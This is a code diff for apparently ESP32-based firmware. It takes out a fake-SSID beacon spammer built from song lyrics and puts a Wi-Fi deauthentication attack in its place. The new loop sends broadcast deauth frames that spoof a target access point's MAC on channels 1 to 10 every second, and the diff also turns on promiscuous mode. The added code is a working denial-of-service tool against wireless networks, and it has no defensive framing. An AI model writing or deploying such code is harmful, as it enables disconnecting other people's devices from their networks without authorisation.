@@ -12,34 +12,25 @@ extern "C" {
 
 #include "packet.hpp"
 
-const char *rick_ssids[] = {
-	"01 Never gonna give you up",
-	"02 Never gonna let you down",
-	"03 Never gonna run around",
-	"04 and desert you",
-	"05 Never gonna make you cry",
-	"06 Never gonna say goodbye",
-	"07 Never gonna tell a lie",
-	"08 and hurt you"
-};
-#define TOTAL_LINES (sizeof(rick_ssids) / sizeof(char *))
+PacketSender sender;
 
 void spam_task(void *pvParameter) {
-    PacketSender sender;
-    uint8_t line = 0;
-
-    uint8_t mac[6] = {0};
-    for(int i = 0; i < 5; i++) mac[i] = rick_ssids[i][8];
+    const MacAddr TARGET = {
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
+    };
+    const MacAddr AP = {
+        //replace with your AP's mac address
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    };
 
 	while(1) {
-        vTaskDelay(100 / TOTAL_LINES / portTICK_PERIOD_MS);
+        vTaskDelay(1000 / portTICK_PERIOD_MS);
 
-        //change mac address
-		mac[5]++;
-        sender.beacon(mac, rick_ssids[line], 1, true);
-
-        if(++line >= TOTAL_LINES) {
-            line = 0;
+        for(uint8_t ch = 1; ch < 11; ch++) {
+            printf("Deauthing channel %d\n", ch);
+            esp_err_t res;
+            res = sender.deauth(TARGET, AP, AP, 1, ch);
+            if(res != ESP_OK) printf("  Error: %s\n", esp_err_to_name(res));
         }
     }
 }
@@ -60,6 +51,7 @@ extern "C" void app_main(void) {
 
     ESP_ERROR_CHECK(esp32_deauther_configure_wifi(/* channel */ 1));
 
+    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
     ESP_ERROR_CHECK(esp_wifi_start());
     ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
 
